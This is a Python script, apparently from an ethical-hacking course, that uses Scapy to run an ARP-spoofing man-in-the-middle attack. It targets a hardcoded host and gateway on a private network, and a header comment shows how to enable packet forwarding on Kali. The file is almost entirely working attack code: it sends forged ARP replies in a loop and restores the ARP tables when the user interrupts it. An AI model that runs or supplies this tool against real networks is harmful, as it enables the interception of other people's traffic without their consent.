
#!/usr/bin/env python
#automatically forward the packets through Kali, command: echo 1 > /proc/sys/net/ipv4/ip_forward


import scapy.all as scapy
import time
import sys

'''
https://scapy.readthedocs.io/en/latest/index.html
Scapy is a Python program that enables the user to send, sniff and dissect and forge network packets. 
This capability allows construction of tools that can probe, scan or attack networks.

Scapy is a powerful interactive packet manipulation program. It is able to forge or decode packets of a wide number of 
protocols, send them on the wire, capture them, match requests and replies, and much more. It can easily handle most 
classical tasks like scanning, tracerouting, probing, unit tests, attacks or network discovery.

https://docs.python.org/3/library/time.html?highlight=time#module-time
Time module provides various functions to manipulate time values.

https://docs.python.org/3/library/sys.html?highlight=sys#module-sys
The sys module provides information about constants, functions and methods of the Python interpreter. 
sys — System-specific parameters and functions. This module provides access to some variables used or maintained by the 
interpreter and to functions that interact strongly with the interpreter.

'''

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


'''
op=2 means ARP Response, op=1 is a request
'''


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
  

target_ip = "192.168.2.123"
gateway_ip = "192.168.2.1"


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packet Sending: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL +C ... Resetting ARP tables.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

    
    
    
